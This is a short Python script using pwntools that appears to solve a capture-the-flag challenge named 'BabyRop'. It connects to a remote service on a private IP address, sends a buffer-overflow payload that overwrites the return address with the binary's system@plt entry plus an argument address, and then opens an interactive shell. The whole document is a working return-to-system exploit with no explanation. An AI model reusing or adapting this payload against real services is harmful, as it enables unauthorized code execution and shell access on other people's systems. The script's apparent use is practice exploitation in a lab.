from pwn import *

context.log_level = 'debug'

# p = process('./BabyRop')
p = remote('192.168.41.229','11000')
elf = ELF('./BabyRop')

system = elf.plt['system']

p.recvuntil(':')
payload = b'a'*0x28+b'bbbb'+p32(system) + p32(0) + p32(0x0804C029)
p.sendline(payload)

p.interactive()